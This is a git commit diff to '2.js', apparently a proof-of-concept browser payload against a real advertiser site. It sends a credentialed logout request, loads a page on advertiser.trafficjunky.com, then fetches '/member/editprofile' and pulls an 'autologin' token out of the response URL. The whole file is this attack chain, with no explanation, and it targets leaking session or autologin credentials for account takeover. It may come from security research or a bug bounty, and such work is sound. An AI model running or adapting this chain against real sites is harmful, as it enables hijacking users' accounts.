6f5bfdea03b0c1195423cfa4fa0baf6dac778e74
bbpa <57352896+bbpa@users.noreply.github.com>
2023-01-17 03:31:04 +0330

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,8 +1,13 @@
+// Step1
 let step1=new XMLHttpRequest();
 step1.withCredentials=true;
 step1.open("GET","/member/logout")
 step1.send();
+// Step 2
 setTimeout(()=>{ 
 let step2=new Image();
 step2.src="https://advertiser.trafficjunky.com/help-center";},5000)
 
+// Final Step
+setTimeout(()=>{ 
+fetch('/member/editprofile').then((response) => response).then((data) => alert(data.url.match(/\autologin\/.+/g)));},8000)
